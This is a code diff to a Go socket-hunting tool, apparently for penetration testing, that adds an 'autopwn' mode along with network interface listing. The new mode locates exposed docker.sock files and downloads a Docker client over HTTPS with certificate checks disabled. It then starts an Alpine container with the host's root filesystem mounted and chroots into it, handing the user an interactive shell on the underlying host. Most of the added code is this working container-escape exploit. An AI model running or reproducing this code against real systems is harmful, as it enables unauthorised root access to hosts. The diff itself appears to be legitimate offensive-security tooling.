@@ -1,23 +1,44 @@
 package main
 
 import (
+	"archive/tar"
+	"compress/gzip"
+	"crypto/tls"
+	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"log"
+	"net"
 	"net/http"
 	"os"
+	"os/exec"
+	"os/signal"
 	"path/filepath"
+	"syscall"
 	"time"
 
+	"github.com/kr/pty"
 	"github.com/tv42/httpunix"
+	"golang.org/x/crypto/ssh/terminal"
 )
 
-var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr *bool
+var verbosePtr, huntSockPtr, huntHttpPtr, huntDockerPtr, interfacesPtr, toJsonPtr, autopwnPtr *bool
 var validSocks []string
+var foundSock bool
+
+type IpAddress struct {
+	Address string
+}
+
+type Interface struct {
+	Name      string
+	Addresses []IpAddress
+}
 
 func main() {
 	fmt.Println("[+] Hunt 'dem Socks")
-
+	foundSock = false
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
 	pathPtr := flag.String("path", ".", "Path to Start Scanning for UNIX Domain Sockets")
@@ -25,6 +46,9 @@ func main() {
 	huntSockPtr = flag.Bool("socket", true, "Hunt for Available UNIX Domain Sockets")
 	huntHttpPtr = flag.Bool("http", false, "Hunt for Available UNIX Domain Sockets with HTTP")
 	huntDockerPtr = flag.Bool("docker", false, "Hunt for docker.sock")
+	interfacesPtr = flag.Bool("interfaces", false, "Display available network interfaces")
+	toJsonPtr = flag.Bool("json", false, "Return output in JSON format")
+	autopwnPtr = flag.Bool("autopwn", false, "Attempt to autopwn exposed sockets")
 
 	flag.Parse()
 	var sockets, httpSockets []string
@@ -62,7 +86,215 @@ func main() {
 		}
 	}
 
-	fmt.Println("[+] Finished Scanning")
+	if *interfacesPtr {
+		err := processInterfaces()
+		if err != nil {
+			fmt.Println("[ERROR]", err)
+		}
+	}
+
+	if !foundSock {
+		if *pathPtr != "/" {
+			fmt.Println("[*] No accessible sockets found,try change search path e.g -path=/")
+		}
+	}
+
+	if *autopwnPtr {
+		fmt.Println("[+] Attempting to autopwn")
+		if len(sockets) == 0 {
+			sockets, _ = getValidSockets(*pathPtr)
+		}
+		if len(httpSockets) == 0 {
+			httpSockets = getHTTPEnabledSockets(sockets)
+		}
+		dockerSocks := getDockerEnabledSockets(httpSockets)
+		for _, element := range dockerSocks {
+			autopwn(element)
+		}
+	}
+	fmt.Println("[+] Finished")
+}
+
+func downloadFile(filepath string, url string) error {
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: transport}
+	resp, err := client.Get(url)
+	if err != nil {
+		return err
+	}
+
+	defer resp.Body.Close()
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+	_, err = io.Copy(out, resp.Body)
+	return err
+}
+
+func dropToTTY(dockerSockPath string) error {
+	// this code has been copy+pasted directly from https://github.com/kr/pty, it's that awesome
+	strCommand := "./docker/docker -H unix://" + dockerSockPath + " run -t -i -v /:/host alpine:latest /bin/sh"
+	c := exec.Command("sh", "-c", strCommand)
+
+	// Start the command with a pty.
+	ptmx, err := pty.Start(c)
+	if err != nil {
+		return err
+	}
+
+	// Make sure to close the pty at the end.
+	defer func() { _ = ptmx.Close() }() // Best effort.
+
+	// Handle pty size.
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGWINCH)
+	go func() {
+		for range ch {
+			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
+				log.Printf("error resizing pty: %s", err)
+			}
+		}
+	}()
+	ch <- syscall.SIGWINCH // Initial resize.
+	go func() {
+		ptmx.Write([]byte("chroot /host && clear\n"))
+	}()
+
+	// Set stdin in raw mode.
+	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		panic(err)
+	}
+	defer func() { _ = terminal.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+
+	go func() {
+		ptmx.Write([]byte("echo 'You are now on the underlying host'\n"))
+	}()
+	// Copy stdin to the pty and the pty to stdout.
+	go func() { _, _ = io.Copy(ptmx, os.Stdin) }()
+	_, _ = io.Copy(os.Stdout, ptmx)
+	return nil
+}
+
+func autopwn(dockerSock string) error {
+	fmt.Println("[+] Attempting to Autopwn: ", dockerSock)
+	fmt.Println("[*] Getting Docker client...")
+	fileUrl := "https://download.docker.com/linux/static/stable/x86_64/docker-18.09.2.tgz"
+
+	if err := downloadFile("docker-18.09.2.tgz", fileUrl); err != nil {
+		return err
+	}
+
+	file, err := os.Open("docker-18.09.2.tgz")
+	if err != nil {
+		return err
+	}
+	err = untar(".", file)
+	if err != nil {
+		return err
+	}
+	fmt.Println("[*] Successfully got Docker client...")
+
+	fmt.Println("[+] Attempting to escape to host...")
+
+	err = dropToTTY(dockerSock)
+	if err != nil {
+		return err
+	}
+
+	fmt.Println("[*] Successfully exited TTY")
+	return nil
+}
+
+func untar(dst string, r io.Reader) error {
+	// this code has been copy pasted from this great gist https://gist.github.com/sdomino/635a5ed4f32c93aad131#file-untargz-go
+	gzr, err := gzip.NewReader(r)
+	if err != nil {
+		return err
+	}
+	defer gzr.Close()
+	tr := tar.NewReader(gzr)
+	for {
+		header, err := tr.Next()
+		switch {
+		// if no more files are found return
+		case err == io.EOF:
+			return nil
+		// return any other error
+		case err != nil:
+			return err
+		// if the header is nil, just skip it (not sure how this happens)
+		case header == nil:
+			continue
+		}
+		// the target location where the dir/file should be created
+		target := filepath.Join(dst, header.Name)
+		// check the file type
+		switch header.Typeflag {
+
+		// if its a dir and it doesn't exist create it
+		case tar.TypeDir:
+			if _, err := os.Stat(target); err != nil {
+				if err := os.MkdirAll(target, 0755); err != nil {
+					return err
+				}
+			}
+		// if it's a file create it
+		case tar.TypeReg:
+			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
+			if err != nil {
+				return err
+			}
+			// copy over contents
+			if _, err := io.Copy(f, tr); err != nil {
+				return err
+			}
+			// manually close here after each file operation; defering would cause each file close
+			// to wait until all operations have completed.
+			f.Close()
+		}
+	}
+}
+
+func processInterfaces() error {
+	fmt.Println("[+] Looking for Interfaces")
+	var interfaceResults []Interface
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return err
+	}
+	for _, i := range interfaces {
+		byNameInterface, err := net.InterfaceByName(i.Name)
+		var result Interface
+		result.Name = i.Name
+
+		fmt.Println("[*] Got Interface: " + i.Name)
+		if err != nil {
+			return err
+		}
+		addresses, err := byNameInterface.Addrs()
+		var addressResults []IpAddress
+		for _, v := range addresses {
+			fmt.Println("\t[*] Got address: " + v.String())
+			var address IpAddress
+			address.Address = v.String()
+			addressResults = append(addressResults, address)
+		}
+		result.Addresses = addressResults
+		interfaceResults = append(interfaceResults, result)
+	}
+	if *toJsonPtr {
+		js, err := json.Marshal(interfaceResults)
+		if err != nil {
+			return err
+		}
+		fmt.Println(string(js[:]))
+	}
+	return nil
 }
 
 func getDockerEnabledSockets(socks []string) []string {
@@ -122,6 +354,7 @@ func walkpath(path string, info os.FileInfo, err error) error {
 				fmt.Println("[+] Valid Socket: " + path)
 			}
 			validSocks = append(validSocks, path)
+			foundSock = true
 		default:
 			if *verbosePtr {
 				fmt.Println("[!] Invalid Socket: " + path)
@@ -132,7 +365,6 @@ func walkpath(path string, info os.FileInfo, err error) error {
 }
 
 func getValidSockets(startPath string) ([]string, error) {
-
 	err := filepath.Walk(startPath, walkpath)
 	if err != nil {
 		if *verbosePtr {
@@ -144,7 +376,6 @@ func getValidSockets(startPath string) ([]string, error) {
 }
 
 func checkSock(path string) (*http.Response, error) {
-
 	if *verbosePtr {
 		fmt.Println("[-] Checking Sock for HTTP: " + path)
 	}
